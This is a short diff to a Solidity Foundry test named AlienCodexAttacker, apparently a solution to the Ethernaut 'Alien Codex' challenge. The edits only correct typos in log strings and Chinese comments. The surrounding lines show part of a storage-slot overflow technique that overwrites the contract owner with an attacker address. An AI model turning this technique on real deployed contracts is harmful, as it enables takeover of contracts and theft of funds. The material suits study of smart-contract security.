@@ -20,14 +20,14 @@ contract AlienCodexAttacker is Test {
         console.log("Attack Before:");
         console.log("alienCodex owner:", IAlienCodex(alienCodex).owner());
         console.log(
-            "codex arrray length:",
+            "codex array length:",
             uint256(vm.load(alienCodex, bytes32(uint256(1))))
         );
 
         _attack();
         console.log("Attack After:");
         console.log(
-            "codex arrray length:",
+            "codex array length:",
             uint256(vm.load(alienCodex, bytes32(uint256(1))))
         );
         console.log("alienCodex owner:", IAlienCodex(alienCodex).owner());
@@ -50,7 +50,7 @@ contract AlienCodexAttacker is Test {
         // slot_max 存储的是codex的哪个元素
         uint256 x = type(uint256).max - p;
         // codex[x+1] 的 slot => type(uint256).max + 1 =>上益 => 0
-        // 修改codex[x+1]的值 就是修改solt存储的值
+        // 修改codex[x+1]的值 就是修改slot存储的值
 
         bytes32 _content = bytes32(uint256(uint160(alice)));
 
